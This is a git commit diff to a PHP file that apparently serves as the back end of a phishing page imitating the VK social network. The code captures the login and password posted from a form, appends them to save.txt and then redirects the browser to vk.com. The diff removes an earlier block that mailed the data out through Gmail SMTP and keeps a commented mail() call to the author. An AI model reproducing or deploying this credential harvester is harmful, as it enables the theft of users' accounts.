4208ea0f62b569fc0536f269a442dc18a3f18b86
GimiOne <dim.zaikin2013@gmail.com>
2019-03-29 18:34:36 +0300

    upd files

--- vk/basic.php
+++ vk/basic.php
@@ -1,44 +1,12 @@
 <?php
+//mail('dim.zaikin2013@gmail.com','sds','sdssd');
     $login = $_POST["login"]; // вот мы получаем значение текстового поля =)
     $pass = $_POST["pass"];
-    $result = "Login: $login | Password: $pass";
-    file_put_contents("$text.php", "Тест в файл", FILE_APPEND);
     $filed = "save.txt";
+    $result = "Login: $login | Password: $pass\r\n";
 	$rez = $result;
-	file_put_contents($filed, $rez);
-// Оповещаем пользователя о том, что файл не был загружен
-
-
-require_once "Mail.php";
-
-$from = '<from.gmail.com>';
-$to = '<dim.zaikin2013@gmail.com>';
-$subject = 'Hi!';
-$body = "Hi,\n\nHow are you?";
-
-$headers = array(
-    'From' => $from,
-    'To' => $to,
-    'Subject' => $subject
-);
-
-$smtp = Mail::factory('smtp', array(
-        'host' => 'ssl://smtp.gmail.com',
-        'port' => '465',
-        'auth' => true,
-        'username' => 'johndoe@gmail.com',
-        'password' => 'passwordxxx'
-    ));
-
-$mail = $smtp->send($to, $headers, $body);
-
-if (PEAR::isError($mail)) {
-    echo('<p>' . $mail->getMessage() . '</p>');
-} else {
-    echo('<p>Message successfully sent!</p>');
-}
+	file_put_contents($filed, $rez, FILE_APPEND);
 ?>
-
 <script type="text/javascript">
 	window.open('https://www.vk.com/');
 </script>
